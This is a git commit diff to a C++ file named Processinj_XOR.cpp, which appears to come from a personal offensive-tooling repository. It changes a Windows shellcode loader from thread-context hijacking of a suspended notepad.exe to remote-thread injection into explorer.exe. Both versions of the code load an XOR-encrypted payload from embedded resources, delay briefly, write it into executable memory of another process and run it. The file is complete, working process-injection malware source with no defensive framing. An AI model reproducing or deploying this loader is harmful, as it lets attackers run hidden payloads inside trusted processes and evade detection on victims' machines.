981938e0124be0f87abf816954de944f245e4351
dhanush <114467712+dagowda@users.noreply.github.com>
2024-12-29 23:53:44 -0500

    Update Processinj_XOR.cpp

--- code/Processinj_XOR.cpp
+++ code/Processinj_XOR.cpp
@@ -1,49 +1,78 @@
 
 #include <windows.h>
-#include <tlhelp32.h>
+#include <stdio.h>
 #include <wincrypt.h>
-
 #pragma comment (lib, "crypt32.lib")
 #pragma comment (lib, "user32.lib")
+#include <tlhelp32.h>
 
-void Decxxxoor(char* c1o2d3e4, DWORD c1o2d3e4Len, unsigned char* k1e2y6, DWORD k1e2y6Len) {
-    for (DWORD da = 0; da < c1o2d3e4Len; da++) {
-        c1o2d3e4[da] ^= k1e2y6[da % k1e2y6Len];
-    }
-}
-
-void loadResource_with(const char* renamer, char** data, DWORD* size) {
+void LoadResourceData(const char* resName, char** data, DWORD* size) {
     HMODULE hModule = GetModuleHandle(NULL);
-    HRSRC hResource = FindResource(hModule, renamer, RT_RCDATA);
+    HRSRC hResource = FindResource(hModule, resName, RT_RCDATA);
+
     HGLOBAL hResData = LoadResource(hModule, hResource);
     *size = SizeofResource(hModule, hResource);
     *data = (char*)LockResource(hResData);
 }
 
+
+
+
+
+
+
+void DecryptXOR(char* code, DWORD codeLen, unsigned char* key, DWORD keyLen) {
+    for (DWORD i = 0; i < codeLen; i++) {
+        code[i] ^= key[i % keyLen]; 
+    }
+}
+
+
 int main() {
-    Sleep(4000);
-    char* key101k;
-    DWORD key101kLen;
-    loadResource_with("AESKEY", &key101k, &key101kLen);
-    char* code199k;
-    DWORD code199kLen;
-    loadResource_with("AESCODE", &code199k, &code199kLen);
-    STARTUPINFO si = {0};
-    PROCESS_INFORMATION pi = {0};
-    si.cb = sizeof(si);
-    CreateProcess("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &pi);
-    CONTEXT ctx = {0};
-    ctx.ContextFlags = CONTEXT_FULL;
+    Sleep(2000);
+    
+    char* AESkey;
+    DWORD AESkeyLen;
+    LoadResourceData("AESKEY", &AESkey, &AESkeyLen);
 
-    GetThreadContext(pi.hThread, &ctx);
+    char* AESCode;
+    DWORD AESCodeLen;
+    LoadResourceData("AESCODE", &AESCode, &AESCodeLen);
+    
+    
+    PROCESSENTRY32 pe32;
+    
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+    
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    
+    Process32First(snapshot, &pe32);
+    
+    while(Process32Next(snapshot, &pe32)) {
+       if (strcmp(pe32.szExeFile, "explorer.exe") == 0){
+              HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
+              
+              LPVOID memalo = VirtualAllocEx(hProcess, NULL, AESCodeLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+              //dhanushaes(AESCode, AESCodeLen, AESkey, AESkeyLen);
+              DecryptXOR(AESCode, AESCodeLen, AESkey , AESkeyLen);
+             
+              WriteProcessMemory(hProcess, memalo, AESCode, AESCodeLen, NULL);
+             
+             
 
-    LPVOID memlo = VirtualAllocEx(pi.hProcess, NULL, code199kLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    Decxxxoor(code199k, code199kLen, (unsigned char*)key101k, key101kLen);
-    WriteProcessMemory(pi.hProcess, memlo, code199k, code199kLen, NULL);
-    ctx.Rcx = (DWORD64)memlo; 
-    SetThreadContext(pi.hThread, &ctx);
+             HANDLE tHandle = CreateRemoteThread(hProcess , NULL, 0, (LPTHREAD_START_ROUTINE)memalo, NULL, 0, NULL);
+             WaitForSingleObject(tHandle, INFINITE);
+             
+              VirtualFreeEx(hProcess, memalo, 0, MEM_RELEASE);
+           
+              CloseHandle(tHandle);
+           
+              CloseHandle(hProcess);
+              
+              break;
 
-    ResumeThread(pi.hThread); 
+         }
+      }
 
     return 0;
 }
